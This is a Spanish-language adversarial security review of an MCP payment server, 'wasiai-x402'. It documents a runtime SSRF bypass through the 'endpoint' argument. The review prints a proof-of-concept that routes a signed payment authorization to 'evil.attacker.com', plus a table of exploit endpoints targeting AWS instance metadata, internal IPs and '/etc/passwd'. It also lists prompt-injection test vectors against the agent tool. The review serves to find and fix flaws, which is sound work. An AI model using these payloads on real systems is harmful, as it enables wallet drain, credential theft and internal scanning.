# Adversarial Review (AR) — WKH-64 MCP wasiai-x402

> **VEREDICTO**: **BLOQUEANTE** — fix-pack obligatorio antes de mergear.
> Branch: `feat/069-wkh-64-mcp-x402` @ commit `4c28f4d`
> Adversary: nexus-adversary (auto QUALITY pipeline)
> Fecha: 2026-04-29

## Resumen ejecutivo

- **Tests**: 54/54 pass (`node --test 'tests/*.test.mjs'`).
- **ACs cubiertos por tests**: 16/16 con evidencia archivo:línea.
- **CDs cubiertos**: 16/16, mayoría OK; CD-7 **FAIL** (ver BLQ-ALTO-1).
- **Vectores adversariales (V1–V9)**: 8/9 PASS, **V3 FAIL** (un sub-vector crítico).
- **Findings**: **1 BLOQUEANTE-ALTO**, **0 BLOQUEANTE-MEDIO**, **2 BLOQUEANTE-BAJO**, **3 MENORES**.
- **Bug crítico**: el SSRF guard al startup (`WASIAI_GATEWAY_URL`) **se bypassa por completo** en runtime porque `pay_x402` y `get_payment_quote` aceptan `endpoint` absoluto del input y `new URL(absolute, base)` ignora el `base`. Permite drain del operator wallet + AWS metadata theft + scan de redes internas. Reproducción adjunta.

---

## BLOQUEANTES

### BLQ-ALTO-1 — SSRF runtime bypass via `endpoint` argument (también: signed-envelope hijacking)

- **Categoría**: Security / SSRF / Constraint Directive CD-7 violation / cross-origin signed-envelope theft.
- **Archivo:línea**: `mcp-servers/wasiai-x402/src/index.mjs:94` (`get_payment_quote`) y `:138` (`pay_x402`).
- **Código vulnerable**:
  ```js
  const url = new URL(endpoint, cfg.gatewayUrl).toString();
  ```
- **Problema**: `new URL(arg, base)` ignora `base` cuando `arg` es **absolute** (con scheme + host). El SDD §15 V3 + CD-7 + AC-8 protegen `WASIAI_GATEWAY_URL` al startup, pero un agente (o un prompt injection) puede pasar `endpoint = 'https://evil.com/...'` o `'http://169.254.169.254/...'` y la request va a ese host — saltea totalmente el guard.

#### Reproducción ejecutable (evidencia)

Con un mock fetch + payload del attacker:

```js
import { payX402Handler } from './src/index.mjs';
process.env.OPERATOR_PRIVATE_KEY = '0x' + 'EE'.repeat(32);
const cfg = { /* gateway = https://app.wasiai.io, chainId 2368, ... */ };

globalThis.fetch = async (url, init = {}) => {
  console.log('CALL TO:', url);  // → "https://evil.attacker.com/x402-trap"
  if (init.headers?.['payment-signature']) return new Response('{"stolen":true}', { status: 200 });
  return new Response(JSON.stringify({ accepts: [{
    payTo: '0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',  // attacker
    maxAmountRequired: '1000000000000000000',  // 1 PYUSD
    network: 'eip155:2368',
  }]}), { status: 402 });
};

const r = await payX402Handler({ endpoint: 'https://evil.attacker.com/x402-trap' }, cfg);
// r.ok === true, stage 'settled' — el operator firmó 1 PYUSD a 0xaaa..aaa
// y el envelope llegó al host del attacker (calls[1].url === 'https://evil.attacker.com/x402-trap')
```

Output observado durante la AR:
```
First call URL: https://evil.attacker.com/x402-trap
Second call URL: https://evil.attacker.com/x402-trap
Signed authorization.to (attacker): 0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Signed authorization.value: 1000000000000000000
Bytes len of envelope: 592
```

#### Variantes que también explotan el bug

| Endpoint pasado | URL final que se hitea |
|---|---|
| `https://evil.attacker.com/x` | `https://evil.attacker.com/x` |
| `http://169.254.169.254/latest/meta-data/` | `http://169.254.169.254/latest/meta-data/` (AWS IMDS leak) |
| `https://10.0.0.1/internal` | `https://10.0.0.1/internal` (RFC1918 scan) |
| `//evil.com/path` | `https://evil.com/path` (protocol-relative) |
| `\\\\evil.com\\path` | `https://evil.com/path` (backslash-style) |
| `file:///etc/passwd` | `file:///etc/passwd` (fetch likely rejects, but reached) |

#### Impacto

1. **Drain del operator wallet (Kite testnet, y mainnet en cuanto se cambie `KITE_CHAIN_ID=2366`)**. El attacker recibe un EIP-3009 `TransferWithAuthorization` válido que puede submitear on-chain hasta su `validBefore`. Si `MCP_MAX_AMOUNT_WEI_DEFAULT` está vacío (default según `.env.example:55`), el cap no protege; el `maxAmountRequired` lo dicta el attacker.
2. **AWS IMDS theft** en cloud-managed envs (Claude Console probable AWS) — la respuesta de `169.254.169.254/latest/meta-data/iam/security-credentials/<role>` se devuelve en el `result`/`body` al agente, que la imprime en transcript.
3. **Internal network scan / info leak**.

#### Por qué los tests no lo detectaron

Los 12 tests de `tests/tools.test.mjs` siempre usan `endpoint: '/api/v1/...'` (path absoluto al gateway base). Ninguno prueba `endpoint: 'https://...'`. SDD §15 no enumera este vector explícito (V3 está orientado a `WASIAI_GATEWAY_URL` startup, no al `endpoint` runtime).

#### Fix sugerido (no aplico — sólo describo)

En `getPaymentQuoteHandler` y `payX402Handler`, después de construir `new URL(endpoint, cfg.gatewayUrl)`:

```js
const target = new URL(endpoint, cfg.gatewayUrl);
if (target.host !== cfg.gatewayUrl.host || target.protocol !== cfg.gatewayUrl.protocol) {
  return { ok: false, stage: 'input', error: 'endpoint must be a path on the configured gateway' };
}
```

Alternativa más estricta: rechazar cualquier `endpoint` que no empiece con `/`. (Más simple, menos sutil; recomiendo esto + un test que pase `https://...` y verifique que se rechaza pre-fetch.)

#### Test que debería bloquear regresión (sugerido para fix-pack)

```js
test('AR-BLQ-1: payX402Handler rejects absolute endpoint URLs', async () => {
  const calls = [];
  globalThis.fetch = async (u) => { calls.push(u); return new Response('{}', {status:200}); };
  const r = await payX402Handler({ endpoint: 'https://evil.com/x' }, fakeConfig());
  assert.equal(r.ok, false);
  assert.equal(r.stage, 'input');
  assert.equal(calls.length, 0, 'must NOT issue any fetch when endpoint is absolute');
});
```

---

### BLQ-BAJO-2 — `accepts[0].payTo` no validado como dirección antes de pasar a viem; mensaje de error de viem se incluye en `r.error`

- **Categoría**: Error Handling / Output integrity.
- **Archivo:línea**: `src/index.mjs:209` (pasa `accepts.payTo` a `signX402Envelope` sin validar shape) y `:224` (`error: \`signing failed: ${e.message}\``).
- **Problema**: si el gateway devuelve `payTo` malformado (e.g. `"NOT_AN_ADDRESS"`), viem throws con un mensaje verboso (`"Address \"NOT_AN_ADDRESS\" is invalid.\n\n- Address must be..."`) que se concatena directamente en el `error` retornado al agente.
- **Reproducción**: ver mi captura en V_SSRF/V_endpoint_test (test 1) — el mensaje de viem aparece en el shape `{ ok:false, stage:'sign', error:'signing failed: Address "NOT_AN_ADDRESS" is invalid.\n\n- Address must be...' }`.
- **Severidad BAJO**: NO leak de PK (verificado V1.3). Pero:
  - El error viaja al agente y queda en logs del agente con multi-línea + version banner de viem.
  - Permite fingerprinting del cliente (versión exacta de viem) — info útil para un attacker.
  - La spec §4.5 dice que sign error → `'signing failed: <descripción sin PK>'` — cumple sólo el "sin PK"; pero "descripción" debería ser sanitizada (corta, una línea, sin version banner).
- **Fix sugerido**: validar `/^0x[0-9a-fA-F]{40}$/.test(accepts.payTo)` antes de firmar; en el catch del sign, hacer `e.message.split('\n')[0]` y limitarlo a 200 chars.

---

### BLQ-BAJO-3 — la sanitización de input (`sanitizeInput`) sólo elimina top-level pero el README admite la limitación; sin embargo, el log de `tool.pay_x402.signed` incluye `signature: envelope.signature` plaintext en el field — el redactor `log.mjs` lo trunca, pero **el truncado es sólo a 10 chars**, lo que filtra los primeros 10 chars de la firma a stderr

- **Categoría**: Output integrity / Security (defense-in-depth).
- **Archivo:línea**:
  - `src/index.mjs:227-231` (info log con `signature: envelope.signature`).
  - `src/log.mjs:30-31` (`v.slice(0, 10) + '…'`).
  - Test `tools.test.mjs:441` que verifica que el log truncado termina con `…`.
- **Problema**: 10 chars de firma ECDSA filtrados a stderr **no son recuperables como PK** (las primeras bytes de una signature no permiten derivar la PK), así que la severidad real es BAJA. Pero el SDD §15 V8.1 dice "pay_x402 returns NEVER includes signature en plaintext" — eso se cumple en el RETURN (verificado), pero el LOG sí lo incluye (10 chars). Si la intención del redactor era "0 leak" en stderr, el truncado a 10 chars filtra el header de la firma (recuperable mediante search en explorers para correlacionar txs y descubrir el operator).
- **Severidad BAJO**: la fuga es 10 chars hex = 40 bits, no permite key recovery, sí permite fingerprinting/correlation. El README dice "signature truncated for debugging" — comportamiento documentado en `tools.test.mjs:T36`.
- **Recomendación**: revisar si vale la pena loggear el prefijo en absoluto. Reemplazar por `signature: '<redacted>'` (sin prefijo) eliminaría 100% del riesgo. NO bloqueante per se — es una decisión de operadores cuán paranoicos son. Lo marco BAJO porque:
  - El test existente lo afirma como comportamiento esperado.
  - `tests/tools.test.mjs:439-442` valida que el truncado funciona (no que sea 0-leak).
  - El SDD §15 V8.1 no aplica al log (sólo al return).

> **Nota sobre granularidad**: si el equipo decide que esta severidad es Excesiva como BLOQUEANTE-BAJO porque el comportamiento está testeado y documentado, mover a MENOR es razonable. Mantengo BLQ-BAJO porque la spec menciona "spy `console.*` y `process.stderr.write` con assert ZERO matches" en CD-2 — y este 10-char prefix es un match parcial.

---

## MENORES

### MNR-1 — `dist` (sin barra) NO se cachea en `.gitignore`

- **Archivo:línea**: `mcp-servers/wasiai-x402/.gitignore:9` (`dist/`).
- **Detalle**: la regla `dist/` ignora el directorio `dist/`. Si por error alguien crea un archivo plano `dist` (sin /), git lo trackea. No bloquea AC-15 (que sólo exige `dist/`). No es realista crear un archivo así. **Cosmético**.

### MNR-2 — Validación de `accepts[0].network` no se cruza con `cfg.chainId`

- **Archivo:línea**: `src/index.mjs:175-178` (sólo chequea `accepts.payTo` y `accepts.maxAmountRequired`).
- **Detalle**: el gateway puede devolver `network: 'eip155:2366'` (Kite mainnet) mientras `cfg.chainId=2368`. El código firma con `cfg.chainId=2368` y mete `network: 'eip155:2368'` en el envelope. La discrepancia no rompe la firma (porque siempre se firma con la cfg) pero el envelope queda inconsistente con lo que el gateway pidió. El facilitator probablemente rechaza, lo que produce un fallo en `stage:'settle'` con mensaje confuso. No es BLOQUEANTE (fail-closed), es UX/diagnóstico.
- **Sugerencia**: opcionalmente loggear warn si `accepts.network !== \`eip155:${cfg.chainId}\``.

### MNR-3 — `payX402Handler` interpreta `probeRes.status === 200` como "free endpoint" — semánticamente correcto, pero un attacker que controle endpoint absoluto (BLQ-ALTO-1 fixed) puede devolver 200 con body arbitrario que se devuelve al agente como `result`

- **Archivo:línea**: `src/index.mjs:160-167`.
- **Detalle**: si BLQ-ALTO-1 se fixea, este vector queda neutralizado. Cuando el endpoint está pinned al gateway de confianza, este path es esperado. Lo dejo como MENOR porque, *post-fix*, `result` viene del gateway de confianza — y si la confianza del gateway falla, todo el modelo de seguridad falla.

---

## Detalle por vector adversarial (SDD §15)

### V1 — PK leakage en logs

| Sub | Test/Reproducción | Resultado |
|-----|-------------------|-----------|
| V1.1 (10 paths de error con PK fija, capture stderr/stdout, assert ZERO matches) | `tests/tools.test.mjs:T33 (AC-9)` cubre 6 paths con `0xDE...DE` y assert blob no contiene `DE`x32 ni `de`x32 | **PASS** |
| V1.2 (input PK + env PK ambos no aparecen) | `tests/tools.test.mjs:T34 (AC-10)` + Bonus AC-10 cubren `CA`x32 y `BE`x65 + Bonus payload sig/auth `0xINJECT` | **PASS** |
| V1.3 (Error.stack from signTypedData throw) | Reproducción manual: pasé `to:'NOT_AN_ADDRESS'` + PK `0xDE...DE`, viem throws con `Address "NOT_AN_ADDRESS" is invalid... Version: viem@2.48.4` y stack incluye paths de viem; **PK no aparece** ni en `.message` ni en `.stack` (verificado dos veces, también con PK malformada via `privateKeyToAccount`) | **PASS** |

Salvedad: sí queda un parcial de 10 chars de la firma en stderr (BLQ-BAJO-3), no la PK.

### V2 — Envelope drift

- V2.1 (golden vector byte-a-byte): `tests/sign.test.mjs:T01` PIN al base64 completo (`eyJzaWduYXR1cmUi...`). Lo corrí en mi sesión: 1/1 PASS. **PASS**.
- V2.2 (mutar 1 campo del envelope): cubierto inferred — el assert `equal(r.envelopeBase64, GOLDEN_ENVELOPE_BASE64)` rompe si CUALQUIER byte cambia. T03 también muta `chainId: 2366` y verifica el `network` field. **PASS**.

### V3 — SSRF

| Sub | Resultado |
|-----|-----------|
| V3.1 (`WASIAI_GATEWAY_URL=http://169.254.169.254/...` startup) | **PASS** (server exit=1 con `(category=scheme)` por http; con `https://169.254.169.254` exit=1 con `(category=private-ipv4)` — verificado manualmente) |
| V3.2-V3.8 (RFC1918 + IPv6 startup) | **PASS** — `tests/url-validator.test.mjs:T22, T23` cubren `10.0.0.1, 192.168.1.1, 172.16.0.1, 127.0.0.1, 0.0.0.0, 169.254.169.254, ::1, fc00::1, fe80::1, ::ffff:127.0.0.1` |
| V3.9 (allowlist) | **PASS** — `T24` verifica `MCP_GATEWAY_ALLOWLIST=internal.example.com` permite DNS privado |
| V3.10 (DNS rebinding) | **PASS** parcial — el código resuelve via `dns.lookup` antes del fetch (línea `url-validator.mjs:80`), no hay window de TTL drift entre lookup y fetch (Node fetch usa happy-eyeballs interna que puede repetir el lookup, pero la decisión de allow/deny ya pasó). El resolver custom permite mockear; el riesgo residual es que Node's fetch interno pueda re-resolver y obtener IP distinta — esto es un riesgo conocido del modelo de SSRF prevention en JS. No bloqueante para esta HU. |
| **V3.runtime (NUEVO)** — bypass via `endpoint` argument | **FAIL** — ver BLQ-ALTO-1. Los tests no lo cubren. |

### V4 — Replay

- V4.1 (100 nonces distintos): `tests/sign.test.mjs:T06` — `Set` de 100 nonces, assert size 100. **PASS**.
- V4.2 (validBefore en past): SDD lo declara no-bloqueante. NO se valida client-side. El facilitator es quien rechaza. **OK** (acepted scope).

### V5 — Prompt injection

| Sub | Resultado |
|-----|-----------|
| V5.1 (`OPERATOR_PRIVATE_KEY` en input → ignored, env-PK usado, warn-once) | `tests/tools.test.mjs:T34` PASS — assert `decoded.authorization.from !== '0xattacker'` + 1 línea `mcp.input.forbidden-keys-stripped`. |
| V5.2 (`signature` en input → ignored) | Bonus AC-10 PASS. |
| V5.3 (`authorization` en input → ignored) | Bonus AC-10 PASS — `signature/authorization` keys en `FORBIDDEN_INPUT_KEYS:src/index.mjs:22`. |
| V5.4 (nested PK: `{deeply:{nested:{OPERATOR_PRIVATE_KEY}}}`) | Reproducción manual: la nested PK NO se elimina (sanitizer top-level only por design). Documentado en `README.md:108-112` y SDD §15 V5.4. La PK nested **se envía al gateway en el body** (no se logea localmente). El operator firma con la env PK, no con la nested. **PASS as designed** (decisión arquitectónica explícita). |

### V6 — Cap bypass

- V6.1 (`MCP_MAX_AMOUNT_WEI_DEFAULT=1000`, `maxAmountRequired=10^18` → no firma, no retry, error estructurado): `tests/tools.test.mjs:T35` PASS — `calls.length===1` (sólo probe), `r.stage==='sign'`, `error: /exceeds maxAmountWei guard/`.
- V6.2 (priority per-call > env > undefined): `Bonus V6.2` PASS para el caso "per-call gana sobre env". Mi audit manual de `resolveMaxAmountGuard` agregó 12 casos (negativos, no-num, bigint, number, bool, object, empty string) — todos manejados con fail-closed correcto (BigInt(true)=1n, BigInt(false)=0n, BigInt('')=0n son edge-cases pero seguros porque resultan en guards muy estrictos). **PASS**.

### V7 — Race conditions

- V7.1 (10 concurrent `pay_x402`, distinct nonces, no log corruption): `tests/tools.test.mjs:Bonus V7.1` PASS — header-aware fetch fake, 10 settle-calls, 10 distinct nonces, todas las stderr lines JSON-parseable. La implementación corregida en `auto-blindaje.md:[2026-04-30 00:55]` muestra que el bug original ya fue cazado y arreglado. **PASS**.
- V7.2 (timeout concurrente): manual repro con `payTimeoutMs=50` + fetch que tarda 200ms — el call retorna `{ok:false, stage:'probe', error:'gateway request failed: aborted'}`. No hay crash. **PASS**.

### V8 — Output integrity

- V8.1 (`pay_x402` returns NEVER includes `signature`): grep en `src/index.mjs` de todos los `return {...}` confirma que ningún return path incluye `signature`/`authorization`/`envelopeBase64`. Test `T29:188-189` lo afirma con `assert.ok(!('signature' in r))`. **PASS**.
- V8.2 (`discover_agents` body unchanged): `T26` PASS con `deepEqual` exact body.

### V9 — Supply chain

- `package.json` deps: `@modelcontextprotocol/sdk@1.29.0`, `dotenv@16.6.1`, `viem@2.48.4`. Sin `preinstall`/`postinstall`/`prepare`/`prepack` scripts. devDependencies vacío. **PASS** (informativo).
- `package-lock.json` está commiteado (`git ls-files` lo confirma). Resuelve TBD-1 del SDD por afirmativo.

---

## Acceptance Criteria — verificación

| AC | Status | Evidencia archivo:línea |
|----|--------|-------------------------|
| AC-1 (`discover_agents`) | **PASS** | `src/index.mjs:61-82`; tests `T25, T26` |
| AC-2 (`get_payment_quote` POST sin firma + 402 capture) | **PASS** | `src/index.mjs:84-127`; tests `T27, T28` |
| AC-3 (`pay_x402` full flow PYUSD/Kite/EIP-3009) | **PASS** | `src/index.mjs:129-274` + `src/sign.mjs`; tests `T29` (full flow) + `T01` (golden vector) |
| AC-4 (gateway non-200/non-402 → `{ok:false, stage:'probe'\|'settle', status, body}`) | **PASS** | `src/index.mjs:168-177, 252-263`; tests `T30, T31` |
| AC-5 (sign throw → `{ok:false, stage:'sign', error sin PK}`) | **PASS** | `src/index.mjs:218-225`; test `T32` (assert `!r.error.includes(PK)`); reproducción V1.3 manual |
| AC-6 (PK ausente o malformada → exit ≠ 0, msg `OPERATOR_PRIVATE_KEY is required and must be a 0x-prefixed 32-byte hex` sin valor parcial) | **PASS** | `src/config.mjs:25-31`; tests `T09 (msg exact + no echo), T10 (63 chars), T11 (65 chars), T12 (whitespace prefix)` |
| AC-7 (gateway URL fallback `https://app.wasiai.io` + warn-once) | **PASS** | `src/config.mjs:41-45`; test `T14` |
| AC-8 (gateway URL parseable + scheme + private-IP startup guard) | **PASS startup** / **PARTIAL FAIL runtime via BLQ-ALTO-1** | `src/url-validator.mjs:44-93` + `src/config.mjs:51-59`; tests `T15-T24`. **NOTA**: AC-8 sólo habla del startup; el runtime SSRF via `endpoint` no está cubierto por el AC. → AC-8 técnicamente PASS, pero **CD-7 violado** (ver BLQ-ALTO-1). |
| AC-9 (PK never logged) | **PASS con asterisco** | `src/log.mjs:24-39` (redact); test `T33` (6 paths, 0 matches). **Sutileza**: BLQ-BAJO-3 marca que `signature` se loguea truncada a 10 chars — no es la PK pero es un parcial de la firma. AC-9 estricto (PK) PASS; CD-2 estricto en defensa-in-depth de `console.*` no cubre la signature. |
| AC-10 (input PK/sig/auth ignorados + warn-once top-level) | **PASS top-level** | `src/index.mjs:22-44 (sanitizeInput)`; tests `T34 + Bonus AC-10`. Nested no se inspecciona — documentado como limitación en README:108-112 y SDD §15 V5.4. |
| AC-11 (cap guard pre-sign + per-call/env priority) | **PASS** | `src/index.mjs:46-58 (resolveMaxAmountGuard) + 181-201`; tests `T35 + Bonus V6.2`. |
| AC-12 (suite de tests con golden vector + PK absent + URL invalid + 402 parse) | **PASS** | 54 tests pasan; golden en `T01`, PK absent en `T09`, URL invalid en `T15-T24`, 402 parse en `T27/T29`. |
| AC-13 (README 3 secciones canónicas) | **PASS** | `README.md` sec "Setup local" (línea 22), "Deploy to Claude Console managed env" (línea 49 — texto similar al AC), "Security warnings" (línea 89). |
| AC-14 (`.env.example` documenta TODAS las env vars con name/required?/default/format/example) | **PASS** | `.env.example:9-65`. 10 vars documentadas con comentarios; `OPERATOR_PRIVATE_KEY=0xYourOperatorPrivateKey` (línea 15) coincide con placeholder pattern. |
| AC-15 (`.gitignore` excluye `.env*` excepto `.env.example`) | **PASS** | `.gitignore:1-7`; `git check-ignore` confirma `.env, .env.local, node_modules` excluidos y `.env.example, package-lock.json` no excluidos. |
| AC-16 (logs JSON-line con `{ts, level, tool, stage, gateway, operator, ok}`; PK never; signature truncada) | **PASS** | `src/log.mjs:42-50`; test `T36` parsea cada línea, valida operator address (no PK), firma truncada con `…`. |

---

## Constraint Directives — verificación

| CD | Status | Notas |
|----|--------|-------|
| CD-1 (sin hardcodes) | **PASS** | gateway URL, contract, chainId, decimals todos via env. `KITE_PYUSD` default = `0x8E04D...` viene de `.env.example:39` (no en código). Excepción: `'https://app.wasiai.io'` aparece como default en `config.mjs:43`, justificado por AC-7 + warn-once. |
| CD-2 (PK never in logs/errors/responses) | **PASS** + **caveat BLQ-BAJO-3** | Verificado V1.1, V1.2, V1.3. Caveat: 10 chars de signature en stderr. |
| CD-3 (MCP SDK ≥1.0) | **PASS** | `package.json:23` pins `^1.0.0`; instalado `1.29.0`. APIs `Server`, `StdioServerTransport`, `CallToolRequestSchema`, `ListToolsRequestSchema` presentes. |
| CD-4 (stateless) | **PASS** | Cada call construye su propio nonce/validBefore/AbortController. T07 (PK on-demand) y `Bonus V7.1` (10 concurrent) lo verifican. |
| CD-5 (envelope match exacto smoke script) | **PASS** | `T01` GOLDEN_ENVELOPE_BASE64 PIN al base64 completo. Cualquier byte de drift falla. |
| CD-6 (logs JSON-line + stderr only) | **PASS** | `log.mjs:49 process.stderr.write(line + '\n')`; T36 valida shape. |
| CD-7 (no SSRF a hosts privados) | **FAIL — ver BLQ-ALTO-1** | Startup OK pero runtime via `endpoint` argument **bypasses** completo. |
| CD-8 (`.gitignore` excluye `.env*` salvo `.env.example`) | **PASS** | Verificado con `git check-ignore`. |
| CD-9 (`npm install && npm test` corre sin red) | **PASS** | `npm install` resolvió cache local; tests usan `globalThis.fetch` mock. |
| CD-10 (output determinístico dado inputs) | **PASS** | T01 prueba determinismo exacto (1/1 reps producen mismo base64). |
| CD-11 (test runner = node:test, no vitest/jest) | **PASS** | `package.json:12` usa `node --test`. Imports en tests sólo `node:test, node:assert/strict, node:crypto`. |
| CD-12 (config lee env on-demand, no cache) | **PASS** | `loadConfig()` no cachea fields readonly; `getOperatorAddress()`/`getAccount()` lee `process.env` en cada call (T07 lo verifica). |
| CD-13 (auditar fixtures cuando se introduce threshold sobre env) | **N/A** | No se introdujo threshold nuevo en esta HU. Aplicable preventivamente a futuros fix-packs. |
| CD-14 (PK nunca en `loadConfig()` returned) | **PASS** | T13 valida `!('privateKey' in cfg) && !('OPERATOR_PRIVATE_KEY' in cfg) && !('pk' in cfg)` y `JSON.stringify(cfg)` no incluye PK. |
| CD-15 (logger redacta `OPERATOR_PRIVATE_KEY/privateKey/pk/signature/...`) | **PASS** | `log.mjs:10-20` REDACT_KEYS / TRUNCATE_KEYS. **Caveat**: el redactor descubre `OPERATOR_PRIVATE_KEY` (uppercase env-style) pero no detecta valores sueltos como un hex 0x...64 chars que aparezcan accidentalmente como string en otro field. Es defensa-en-profundidad-parcial. Aceptable en la HU; AC-9 lo cubre con assert empírico. |
| CD-16 (no `process.exit()` en tool handlers) | **PASS** | Sólo `process.exit(1)` en `main()` startup (`src/index.mjs:349, 411`). Handlers retornan shapes estructurados. |

---

## Categorías clásicas (las 8 originales)

| Cat | Status | Notas |
|-----|--------|-------|
| 1. Security | **FAIL** | BLQ-ALTO-1 (SSRF runtime). El resto de superficies (PK leak, prompt injection, replay) PASS. |
| 2. Error Handling | **PARTIAL** | BLQ-BAJO-2 (mensaje de error de viem se incluye crudo). Resto PASS. |
| 3. Data Integrity | OK | nonce 32 bytes random; cap guard pre-sign; idempotencia stateless. |
| 4. Performance | OK | Sin N+1, sin loops innecesarios. fetch + AbortSignal.timeout = 30s default. |
| 5. Integration | OK | Backwards compat: paquete nuevo, no toca `src/`. MCP SDK pin razonable. |
| 6. Type Safety | OK | `.mjs` puro (DT-A). Pocas conversiones; `BigInt()` con try/catch en lugares críticos. Sin `any` (no hay TS). |
| 7. Test Coverage | **PARTIAL** | 54 tests pass, ACs 16/16 cubiertos. PERO: vector "endpoint absoluto" no testeado (de ahí BLQ-ALTO-1 escapó). |
| 8. Scope Drift | OK | Todo bajo `mcp-servers/wasiai-x402/`. No tocó `src/`. |

## Categorías nuevas (las 3 incrementales)

| Cat | Status | Notas |
|-----|--------|-------|
| 9. Destructive Migrations | **N/A** | No hay migrations / SQL en la HU (paquete client-side). |
| 10. RPC con SECURITY DEFINER | **N/A** | No hay funciones postgres / RPC en la HU. |
| 11. Cache Invalidation | **N/A** | Stateless por CD-4. Sin React Query, SWR, Redis, memo, SW, CDN. |

---

## Lista priorizada para fix-pack del Dev

1. **BLQ-ALTO-1** (URGENTE): pinear `endpoint` al `cfg.gatewayUrl.host`/`protocol`. Agregar test que pase `endpoint='https://evil.com/x'` y assert `r.ok===false && calls.length===0`. Aplicar a `getPaymentQuoteHandler` y `payX402Handler`. Esto cierra V3 runtime + protege contra:
   - operator-wallet drain via signed-envelope hijacking
   - AWS IMDS theft
   - internal network scanning
2. **BLQ-BAJO-2**: validar `payTo` shape antes de firmar; truncar/sanitizar `e.message` del catch del sign a primera línea.
3. **BLQ-BAJO-3**: discutir si reemplazar el truncado de `signature` a `'<redacted>'` en log. (Decisión de operadores.)
4. **MNR-1**: cosmético — agregar `dist` (sin slash) al `.gitignore`.
5. **MNR-2**: warn si `accepts.network !== 'eip155:' + cfg.chainId`.
6. **MNR-3**: re-evaluar el handling de probe-200 después de fixear BLQ-ALTO-1.

---

## Métricas finales

- **Tests**: 54/54 pass.
- **ACs cumplidos**: 16/16 (con caveats en AC-8 / AC-9 / AC-10 ya marcados).
- **CDs cumplidos**: 15/16 (CD-7 FAIL).
- **Vectores adversariales**: 8/9 PASS (V3.runtime FAIL).
- **BLOQUEANTES totales**: 3 (1 ALTO, 0 MEDIO, 2 BAJO).
- **MENORES**: 3.

**Tasa de findings calibrados**: cada finding tiene reproducción ejecutable (BLQ-ALTO-1 con código) o test que lo testifica (BLQ-BAJO-2 con captura concreta). 0 sospechas sin evidencia.

---

*AR generado por NexusAgil Adversary — 2026-04-29*
